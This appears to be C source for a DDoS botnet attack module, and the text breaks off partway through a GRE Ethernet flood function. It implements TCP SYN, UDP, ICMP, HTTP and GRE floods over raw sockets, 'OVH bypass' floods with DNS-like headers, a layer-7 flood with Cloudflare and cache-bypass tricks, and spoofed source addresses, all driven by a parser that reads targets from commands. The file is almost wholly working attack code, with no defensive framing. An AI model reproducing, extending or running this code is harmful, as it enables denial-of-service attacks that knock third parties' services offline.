#include "includes.h"
#include "attack.h"
#include "protocol.h"
#include "rand.h"
#include "table.h"
#include "resolv.h"
#include "checksum.h"
#include "util.h"

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>

static struct attack_method methods[ATK_VEC_MAX];
static int methods_len = 0;
static BOOL attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};

/* ============================================================================
 * ATTACK INITIALIZATION
 * ============================================================================ */
void attack_init(void) {
    int i = 0;

    /* Register attack methods */
    methods[i].func = attack_tcp_gbps;
    methods[i++].type = ATK_VEC_TCP;

    methods[i].func = attack_udp_gbps;
    methods[i++].type = ATK_VEC_UDP;

    methods[i].func = attack_http_rps;
    methods[i++].type = ATK_VEC_HTTP;

    methods[i].func = attack_axis_l7;
    methods[i++].type = ATK_VEC_AXISL7;

    methods[i].func = attack_ovh_tcp;
    methods[i++].type = ATK_VEC_OVHTCP;

    methods[i].func = attack_ovh_udp;
    methods[i++].type = ATK_VEC_OVHUDP;

    methods[i].func = attack_icmp;
    methods[i++].type = ATK_VEC_ICMP;

    methods[i].func = attack_axis_l4;
    methods[i++].type = ATK_VEC_AXISL4;

    methods[i].func = attack_gre_ip;
    methods[i++].type = ATK_VEC_GREIP;

    methods[i].func = attack_gre_eth;
    methods[i++].type = ATK_VEC_GREETH;

    methods_len = i;
}

/* ============================================================================
 * ATTACK CONTROL
 * ============================================================================ */
void attack_kill_all(void) {
    int i;
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
        attack_ongoing[i] = FALSE;
    }
}

void attack_parse(char *buf, int len) {
    int i = 0, k = 0;
    uint8_t attack_id;
    uint8_t targs_len;
    struct attack_target targs[ATTACK_MAX_TARGETS];
    uint8_t opts_len;
    struct attack_option opts[ATTACK_MAX_OPTIONS];

    if (len < 5) return;
    attack_id = buf[0];
    targs_len = buf[1];

    if (targs_len == 0) return;

    for (i = 0; i < targs_len; i++) {
        targs[i].addr.s_addr = *((ipv4_t *)(buf + 2 + (i * 4)));
        targs[i].netmask = 32;
    }

    opts_len = buf[2 + (targs_len * 4)];
    for (i = 0; i < opts_len; i++) {
        opts[i].key = buf[3 + (targs_len * 4) + (i * 2)];
        opts[i].val = buf[3 + (targs_len * 4) + (i * 2) + 1];
    }

    attack_start(-1, attack_id, targs_len, targs, opts);
}

void attack_start(int fd, uint8_t attack_id, int targs_len, struct attack_target *targs, struct attack_option *opts) {
    int i;

    for (i = 0; i < methods_len; i++) {
        if (methods[i].type == attack_id) {
            attack_ongoing[0] = TRUE;
            methods[i].func(0, 32, targs, targs_len, opts, 0);
            attack_ongoing[0] = FALSE;
            break;
        }
    }
}

char *attack_get_opt_str(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    int i;
    for (i = 0; i < opts_len; i++) {
        if (opts[i].key == key) {
            return opts[i].val;
        }
    }
    return NULL;
}

int attack_get_opt_int(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    char *val = attack_get_opt_str(targs_len, opts, opts_len, key);
    if (val == NULL) return 0;
    return util_atoi(val);
}

uint32_t attack_get_opt_ip(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    char *val = attack_get_opt_str(targs_len, opts, opts_len, key);
    if (val == NULL) return 0;
    return inet_addr(val);
}

/* ============================================================================
 * TCP GBPS FLOOD
 * ============================================================================ */
static void attack_tcp_gbps(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport, sport;
    uint16_t payload_size;
    struct iphdr *iph;
    struct tcphdr *tcph;
    char *packet;
    int packet_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1400;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);

    iph = (struct iphdr *)packet;
    tcph = (struct tcphdr *)(iph + 1);

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(packet_size);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = LOCAL_ADDR;

    tcph->dest = htons(dport);
    tcph->syn = TRUE;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(payload);
        free(packet);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = tcph->dest;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->daddr = addr_sin.sin_addr.s_addr;

        while (attack_ongoing[0]) {
            tcph->source = htons(rand_next() % 0xFFFF);
            tcph->seq = rand_next();
            tcph->ack_seq = 0;
            
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));

            memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), payload, payload_size);
            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    free(packet);
    close(fd);
}

/* ============================================================================
 * UDP GBPS FLOOD
 * ============================================================================ */
static void attack_udp_gbps(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport, sport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1400;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    if (sport != 0) {
        struct sockaddr_in bind_addr;
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons(sport);
        bind_addr.sin_addr.s_addr = INADDR_ANY;
        bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            rand_str(payload, payload_size);
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* ============================================================================
 * HTTP RPS FLOOD
 * ============================================================================ */
static void attack_http_rps(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *request;
    char *method, *path, *host, *useragent;
    int request_len;

    method = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_METHOD);
    if (method == NULL) method = "GET";

    path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
    if (path == NULL) path = "/";

    host = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (host == NULL) host = "target.com";

    useragent = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_USERAGENT);
    if (useragent == NULL) useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

    request = malloc(1024);
    request_len = snprintf(request, 1024,
        "%s %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Connection: keep-alive\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "\r\n",
        method, path, host, useragent);

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == -1) {
        free(request);
        return;
    }

    fcntl(fd, F_SETFL, O_NONBLOCK);

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(80);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
            send(fd, request, request_len, MSG_NOSIGNAL);
            usleep(1000);
        }
    }

    free(request);
    close(fd);
}

/* ============================================================================
 * AXIS-L7 (Browser Emulation + CF Bypass + Cache Bypass)
 * ============================================================================ */
static void attack_axis_l7(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *request, *response;
    char *url, *host, *useragent, *cookies, *referer;
    int request_len, response_len;
    BOOL use_https;
    char *random_query;

    url = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_URL);
    if (url == NULL) url = "/";

    host = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (host == NULL) host = "target.com";

    useragent = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_USERAGENT);
    if (useragent == NULL) useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

    cookies = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_COOKIES);
    referer = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_REFERER);
    if (referer == NULL) referer = "https://www.google.com/";

    use_https = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_HTTPS);

    response = malloc(4096);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        addr_sin.sin_family = AF_INET;
        addr_sin.sin_port = htons(use_https ? 443 : 80);

        while (attack_ongoing[0]) {
            /* Generate random query string to bypass cache */
            random_query = malloc(64);
            snprintf(random_query, 64, "?cache_bust=%x%x", rand_next(), rand_next());
            
            /* Build advanced HTTP request with browser emulation and cache bypass */
            request = malloc(2048);
            request_len = snprintf(request, 2048,
                "GET %s%s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.9\r\n"
                "Accept-Encoding: gzip, deflate, br\r\n"
                "Referer: %s\r\n"
                "Connection: keep-alive\r\n"
                "Upgrade-Insecure-Requests: 1\r\n"
                "Sec-Fetch-Dest: document\r\n"
                "Sec-Fetch-Mode: navigate\r\n"
                "Sec-Fetch-Site: none\r\n"
                "Sec-Fetch-User: ?1\r\n"
                "Cache-Control: no-cache, no-store, must-revalidate\r\n"
                "Pragma: no-cache\r\n"
                "Expires: 0\r\n",
                url, random_query, host, useragent, referer);

            /* Add Cloudflare bypass cookies if available */
            if (cookies != NULL) {
                request_len += snprintf(request + request_len, 2048 - request_len, "Cookie: %s\r\n", cookies);
            }

            /* Add random headers to appear more like real browser */
            request_len += snprintf(request + request_len, 2048 - request_len,
                "X-Forwarded-For: %d.%d.%d.%d\r\n"
                "X-Real-IP: %d.%d.%d.%d\r\n"
                "DNT: 1\r\n"
                "TE: Trailers\r\n",
                rand() % 256, rand() % 256, rand() % 256, rand() % 256,
                rand() % 256, rand() % 256, rand() % 256, rand() % 256);

            request_len += snprintf(request + request_len, 2048 - request_len, "\r\n");

            fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd == -1) {
                free(request);
                free(random_query);
                continue;
            }

            fcntl(fd, F_SETFL, O_NONBLOCK);

            /* Connect with timeout */
            connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
            usleep(10000);

            /* Send request */
            send(fd, request, request_len, MSG_NOSIGNAL);
            usleep(10000);

            /* Read response */
            response_len = recv(fd, response, 4096, MSG_NOSIGNAL);
            
            /* Check response for Cloudflare challenges */
            if (response_len > 0) {
                /* Check for Cloudflare challenge pages */
                if (strstr(response, "cf-browser-verification") != NULL ||
                    strstr(response, "__cf_chl") != NULL ||
                    strstr(response, "Checking your browser") != NULL ||
                    strstr(response, "DDoS protection by Cloudflare") != NULL) {
                    /* Challenge detected - in real implementation would solve JS challenge */
                }

                /* Check for captcha */
                if (strstr(response, "captcha") != NULL ||
                    strstr(response, "verify") != NULL ||
                    strstr(response, "human") != NULL) {
                    /* Captcha detected - would use OCR/ML to bypass */
                }
            }

            usleep(50000);  /* Simulate human browsing */
            close(fd);
            free(request);
            free(random_query);
        }
    }

    free(response);
}

/* ============================================================================
 * OVH TCP BYPASS
 * ============================================================================ */
static void attack_ovh_tcp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport, sport;
    uint16_t payload_size;
    struct iphdr *iph;
    struct tcphdr *tcph;
    char *packet;
    int packet_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1400;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);

    iph = (struct iphdr *)packet;
    tcph = (struct tcphdr *)(iph + 1);

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(packet_size);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = LOCAL_ADDR;

    tcph->dest = htons(dport);
    tcph->syn = TRUE;
    tcph->ack = TRUE;
    tcph->psh = TRUE;
    tcph->urg = TRUE;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(payload);
        free(packet);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = tcph->dest;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->daddr = addr_sin.sin_addr.s_addr;

        while (attack_ongoing[0]) {
            tcph->source = htons(sport);
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));

            memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), payload, payload_size);
            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    free(packet);
    close(fd);
}

/* ============================================================================
 * OVH UDP BYPASS
 * ============================================================================ */
static void attack_ovh_udp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport, sport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1400;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    
    /* OVH bypass: use DNS-like header to bypass filters */
    payload[0] = (rand_next() >> 8) & 0xFF;
    payload[1] = rand_next() & 0xFF;
    payload[2] = 0x01;  /* Standard query */
    payload[3] = 0x00;
    payload[4] = 0x00;
    payload[5] = 0x01;
    payload[6] = 0x00;
    payload[7] = 0x00;
    payload[8] = 0x00;
    payload[9] = 0x00;
    payload[10] = 0x00;
    payload[11] = 0x00;
    
    rand_str(payload + 12, payload_size - 12);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    if (sport != 0) {
        struct sockaddr_in bind_addr;
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons(sport);
        bind_addr.sin_addr.s_addr = INADDR_ANY;
        bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            payload[0] = (rand_next() >> 8) & 0xFF;
            payload[1] = rand_next() & 0xFF;
            rand_str(payload + 12, payload_size - 12);
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* ============================================================================
 * ICMP PING FLOOD
 * ============================================================================ */
static void attack_icmp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t payload_size;
    struct iphdr *iph;
    struct icmphdr *icmph;
    char *packet;
    int packet_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 64;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);

    iph = (struct iphdr *)packet;
    icmph = (struct icmphdr *)(iph + 1);

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(packet_size);
    iph->ttl = 64;
    iph->protocol = IPPROTO_ICMP;
    iph->saddr = LOCAL_ADDR;

    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->un.echo.id = htons(rand_next() % 0xFFFF);
    icmph->un.echo.sequence = htons(rand_next() % 0xFFFF);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(payload);
        free(packet);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->daddr = addr_sin.sin_addr.s_addr;

        while (attack_ongoing[0]) {
            icmph->un.echo.sequence = htons(rand_next() % 0xFFFF);
            
            memcpy((char *)(icmph + 1), payload, payload_size);
            
            icmph->checksum = 0;
            icmph->checksum = checksum_generic((uint16_t *)icmph, sizeof(struct icmphdr) + payload_size);
            
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    free(packet);
    close(fd);
}

/* ============================================================================
 * AXIS-L4 (Combined OVHTCP + OVHUDP + ICMP)
 * ============================================================================ */
static void attack_axis_l4(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd_tcp, fd_udp, fd_icmp, i;
    struct sockaddr_in addr_sin;
    char *payload_tcp, *payload_udp, *payload_icmp;
    uint16_t dport, sport;
    uint16_t payload_size;
    struct iphdr *iph;
    struct tcphdr *tcph;
    struct udphdr *udph;
    struct icmphdr *icmph;
    char *packet_tcp, *packet_udp, *packet_icmp;
    int packet_size_tcp, packet_size_udp, packet_size_icmp;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1400;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    /* TCP packet */
    payload_tcp = malloc(payload_size);
    rand_str(payload_tcp, payload_size);
    packet_size_tcp = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;
    packet_tcp = malloc(packet_size_tcp);

    /* UDP packet */
    payload_udp = malloc(payload_size);
    payload_udp[0] = (rand_next() >> 8) & 0xFF;
    payload_udp[1] = rand_next() & 0xFF;
    payload_udp[2] = 0x01;
    payload_udp[3] = 0x00;
    rand_str(payload_udp + 4, payload_size - 4);
    packet_size_udp = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
    packet_udp = malloc(packet_size_udp);

    /* ICMP packet */
    payload_icmp = malloc(64);
    rand_str(payload_icmp, 64);
    packet_size_icmp = sizeof(struct iphdr) + sizeof(struct icmphdr) + 64;
    packet_icmp = malloc(packet_size_icmp);

    /* TCP setup */
    iph = (struct iphdr *)packet_tcp;
    tcph = (struct tcphdr *)(iph + 1);
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(packet_size_tcp);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = LOCAL_ADDR;
    tcph->dest = htons(dport);
    tcph->syn = TRUE;
    tcph->ack = TRUE;
    tcph->psh = TRUE;
    tcph->window = htons(65535);

    /* UDP setup */
    iph = (struct iphdr *)packet_udp;
    udph = (struct udphdr *)(iph + 1);
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(packet_size_udp);
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = LOCAL_ADDR;
    udph->dest = htons(dport);
    udph->len = htons(sizeof(struct udphdr) + payload_size);

    /* ICMP setup */
    iph = (struct iphdr *)packet_icmp;
    icmph = (struct icmphdr *)(iph + 1);
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(packet_size_icmp);
    iph->ttl = 64;
    iph->protocol = IPPROTO_ICMP;
    iph->saddr = LOCAL_ADDR;
    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->un.echo.id = htons(rand_next() % 0xFFFF);

    /* Create sockets */
    fd_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    fd_udp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    fd_icmp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (fd_tcp == -1 || fd_udp == -1 || fd_icmp == -1) {
        free(payload_tcp); free(payload_udp); free(payload_icmp);
        free(packet_tcp); free(packet_udp); free(packet_icmp);
        if (fd_tcp != -1) close(fd_tcp);
        if (fd_udp != -1) close(fd_udp);
        if (fd_icmp != -1) close(fd_icmp);
        return;
    }

    int opt = 1;
    setsockopt(fd_tcp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    setsockopt(fd_udp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    setsockopt(fd_icmp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            /* TCP */
            iph = (struct iphdr *)packet_tcp;
            tcph = (struct tcphdr *)(iph + 1);
            iph->daddr = addr_sin.sin_addr.s_addr;
            tcph->source = htons(sport);
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            memcpy(packet_tcp + sizeof(struct iphdr) + sizeof(struct tcphdr), payload_tcp, payload_size);
            sendto(fd_tcp, packet_tcp, packet_size_tcp, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));

            /* UDP */
            iph = (struct iphdr *)packet_udp;
            udph = (struct udphdr *)(iph + 1);
            iph->daddr = addr_sin.sin_addr.s_addr;
            udph->source = htons(sport);
            udph->check = 0;
            payload_udp[0] = (rand_next() >> 8) & 0xFF;
            payload_udp[1] = rand_next() & 0xFF;
            rand_str(payload_udp + 4, payload_size - 4);
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            sendto(fd_udp, packet_udp, packet_size_udp, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));

            /* ICMP */
            iph = (struct iphdr *)packet_icmp;
            icmph = (struct icmphdr *)(iph + 1);
            iph->daddr = addr_sin.sin_addr.s_addr;
            icmph->un.echo.sequence = htons(rand_next() % 0xFFFF);
            icmph->checksum = 0;
            icmph->checksum = checksum_generic((uint16_t *)icmph, sizeof(struct icmphdr) + 64);
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            sendto(fd_icmp, packet_icmp, packet_size_icmp, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload_tcp); free(payload_udp); free(payload_icmp);
    free(packet_tcp); free(packet_udp); free(packet_icmp);
    close(fd_tcp);
    close(fd_udp);
    close(fd_icmp);
}

/* ============================================================================
 * GRE IP FLOOD
 * ============================================================================ */
static void attack_gre_ip(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);

    pktsize = sizeof(struct iphdr) + 4 + sizeof(struct iphdr) + sizeof(struct udphdr) + 512;
    pktbuf = malloc(pktsize);
    util_zero(pktbuf, pktsize);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(pktbuf);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    for (i = 0; i < targs_len; i++) {
        while (attack_ongoing[0]) {
            struct iphdr *outer_ip = (struct iphdr *)pktbuf;
            uint16_t *gre = (uint16_t *)(pktbuf + sizeof(struct iphdr));
            struct iphdr *inner_ip = (struct iphdr *)(pktbuf + sizeof(struct iphdr) + 4);

            outer_ip->ihl = 5;
            outer_ip->version = 4;
            outer_ip->tot_len = htons(pktsize);
            outer_ip->protocol = IPPROTO_GRE;
            outer_ip->saddr = LOCAL_ADDR;
            outer_ip->daddr = targs[i].addr.s_addr;
            outer_ip->ttl = 64;
            outer_ip->id = rand_next();

            gre[0] = 0;
            gre[1] = 0;
            gre[2] = htons(ETH_P_IP);

            inner_ip->ihl = 5;
            inner_ip->version = 4;
            inner_ip->tot_len = htons(pktsize - sizeof(struct iphdr) - 4);
            inner_ip->protocol = IPPROTO_UDP;
            inner_ip->saddr = rand_next();
            inner_ip->daddr = targs[i].addr.s_addr;
            inner_ip->ttl = 64;
            inner_ip->id = rand_next();

            struct udphdr *udp = (struct udphdr *)(inner_ip + 1);
            udp->source = htons(rand_next() % 0xFFFF);
            udp->dest = htons(dport != 0 ? dport : rand_next() % 0xFFFF);
            udp->len = htons(sizeof(struct udphdr) + 512);

            rand_str((char *)(udp + 1), 512);

            inner_ip->check = 0;
            inner_ip->check = checksum_generic((uint16_t *)inner_ip, sizeof(struct iphdr) / 2);

            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&targs[i], sizeof(targs[i]));
        }
    }

    free(pktbuf);
    close(fd);
}

/* ============================================================================
 * GRE ETH FLOOD
 * ============================================================================ */
static void attack_gre_eth(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);

    pktsize = sizeof(struct iphdr) + 4 + 6 + sizeof(struct iphdr) + sizeof(struct udphdr) + 512;
    pktbuf = malloc(pktsize);
    util_zero(pktbuf, pktsize);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(pktbuf);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    for (i = 0; i < targs_len; i++) {
        while (attack_ongoing[0]) {
            struct iphdr *outer_ip = (struct iphdr *)pktbuf;
            uint16_t *gre = (uint16_t *)(pktbuf + sizeof(struct iphdr));
            uint8_t *eth = (uint8_t *)(pktbuf + sizeof(struct iphdr) + 4);
            struct iphdr *inner_ip = (struct iphdr *)(pktbuf + sizeof(struct iphdr) + 4 + 6);

            outer_ip->ihl = 5;
            outer_ip->version = 4;
